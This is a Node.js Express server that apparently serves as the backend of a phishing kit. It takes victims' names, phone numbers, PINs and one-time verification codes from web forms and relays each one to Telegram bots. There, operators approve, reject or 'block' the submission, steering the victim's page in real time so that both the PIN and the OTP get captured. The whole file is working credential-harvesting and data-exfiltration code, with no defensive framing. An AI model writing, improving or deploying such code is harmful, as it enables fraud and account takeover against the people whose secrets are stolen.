require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const BOTS_FILE = path.join(__dirname, 'bots.json');

/* ================= MEMORY STORES ================= */
const approvedPins = {};
const approvedCodes = {};
const blockPins = {};
const redirectToPinCodes = {};
const requestBotMap = {};
const codeApprovedPhones = {}; // 🔑 key fix

/* ================= MULTI-BOT STORE ================= */
let bots = [];
if (fs.existsSync(BOTS_FILE)) {
    try {
        bots = JSON.parse(fs.readFileSync(BOTS_FILE, 'utf-8'));
        console.log('✅ Bots loaded from bots.json:', bots);
    } catch {
        bots = [];
    }
} else {
    bots = [
        { botId: 'bot1', botToken: process.env.BOT1_TOKEN, chatId: process.env.BOT1_CHATID },
        { botId: 'bot2', botToken: process.env.BOT2_TOKEN, chatId: process.env.BOT2_CHATID },
        { botId: 'bot3', botToken: process.env.BOT3_TOKEN, chatId: process.env.BOT3_CHATID },
        { botId: 'bot4', botToken: process.env.BOT4_TOKEN, chatId: process.env.BOT4_CHATID },
        { botId: 'bot5', botToken: process.env.BOT5_TOKEN, chatId: process.env.BOT5_CHATID },
        { botId: 'bot6', botToken: process.env.BOT6_TOKEN, chatId: process.env.BOT6_CHATID },
        { botId: 'bot7', botToken: process.env.BOT7_TOKEN, chatId: process.env.BOT7_CHATID },
        { botId: 'bot8', botToken: process.env.BOT8_TOKEN, chatId: process.env.BOT8_CHATID },
        { botId: 'bot9', botToken: process.env.BOT9_TOKEN, chatId: process.env.BOT9_CHATID },
        { botId: 'bot10', botToken: process.env.BOT10_TOKEN, chatId: process.env.BOT10_CHATID },
        { botId: 'bot11', botToken: process.env.BOT11_TOKEN, chatId: process.env.BOT11_CHATID },
        { botId: 'bot12', botToken: process.env.BOT12_TOKEN, chatId: process.env.BOT12_CHATID },
        { botId: 'bot13', botToken: process.env.BOT13_TOKEN, chatId: process.env.BOT13_CHATID },
        { botId: 'bot14', botToken: process.env.BOT14_TOKEN, chatId: process.env.BOT14_CHATID },
        { botId: 'bot15', botToken: process.env.BOT15_TOKEN, chatId: process.env.BOT15_CHATID },
        { botId: 'bot16', botToken: process.env.BOT16_TOKEN, chatId: process.env.BOT16_CHATID },
        { botId: 'bot17', botToken: process.env.BOT17_TOKEN, chatId: process.env.BOT17_CHATID },
        { botId: 'bot18', botToken: process.env.BOT18_TOKEN, chatId: process.env.BOT18_CHATID },
        { botId: 'bot19', botToken: process.env.BOT19_TOKEN, chatId: process.env.BOT19_CHATID },
        { botId: 'bot20', botToken: process.env.BOT20_TOKEN, chatId: process.env.BOT20_CHATID }
    ];
    fs.writeFileSync(BOTS_FILE, JSON.stringify(bots, null, 2));
}

/* ================= MIDDLEWARE ================= */
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

/* ================= HELPERS ================= */
const getBot = botId => bots.find(b => b.botId === botId);

async function sendTelegramMessage(bot, text, keyboard = []) {
    await axios.post(
        `https://api.telegram.org/bot${bot.botToken}/sendMessage`,
        { chat_id: bot.chatId, text, reply_markup: { inline_keyboard: keyboard } }
    );
}

async function answerCallback(bot, id) {
    await axios.post(
        `https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`,
        { callback_query_id: id }
    );
}

/* ================= PIN ================= */
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    const requestId = uuidv4();

    approvedPins[requestId] = null;
    requestBotMap[requestId] = { botId, phone };

    sendTelegramMessage(bot,
        `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`,
        [[
            { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
            { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
            { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-pin/:id', (req, res) => {
    const id = req.params.id;
    const record = requestBotMap[id];

    if (blockPins[id]) {
        return res.json({ blocked: true, message: 'Enter a valid prepaid number' });
    }

    if (approvedPins[id] === true && codeApprovedPhones[record.phone]) {
        return res.json({ approved: true, redirectToSuccess: true });
    }

    res.json({ approved: approvedPins[id] ?? null });
});

/* ================= CODE ================= */
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    const bot = getBot(botId);
    const requestId = uuidv4();

    approvedCodes[requestId] = null;
    requestBotMap[requestId] = { botId, phone };

    sendTelegramMessage(bot,
        `🔑 CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`,
        [[
            { text: '✅ Correct Code', callback_data: `code_ok:${requestId}` },
            { text: '❌ Wrong Code', callback_data: `code_bad:${requestId}` },
            { text: '✅ Correct Code + ❌ Wrong PIN', callback_data: `code_pin:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-code/:id', (req, res) => {
    if (redirectToPinCodes[req.params.id]) {
        return res.json({ redirectToPin: true });
    }
    res.json({ approved: approvedCodes[req.params.id] ?? null });
});

/* ================= TELEGRAM WEBHOOK ================= */
app.post('/telegram-webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    const cb = req.body.callback_query;
    if (!cb) return res.sendStatus(200);

    const [action, requestId] = cb.data.split(':');
    const record = requestBotMap[requestId];
    let feedback = '';

    if (action === 'pin_ok') { approvedPins[requestId] = true; feedback = 'PIN approved'; }
    if (action === 'pin_bad') { approvedPins[requestId] = false; feedback = 'PIN rejected'; }
    if (action === 'pin_block') { blockPins[requestId] = true; feedback = 'User blocked – enter valid prepaid number'; }
    if (action === 'code_ok') { approvedCodes[requestId] = true; codeApprovedPhones[record.phone] = true; feedback = 'Code approved'; }
    if (action === 'code_bad') { approvedCodes[requestId] = false; feedback = 'Code rejected'; }
    if (action === 'code_pin') { redirectToPinCodes[requestId] = true; codeApprovedPhones[record.phone] = true; feedback = 'Code approved – re-enter PIN'; }

    await sendTelegramMessage(bot, `📝 Feedback:\n${feedback}`);
    await answerCallback(bot, cb.id);
    res.sendStatus(200);
});

/* ================= START ================= */
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
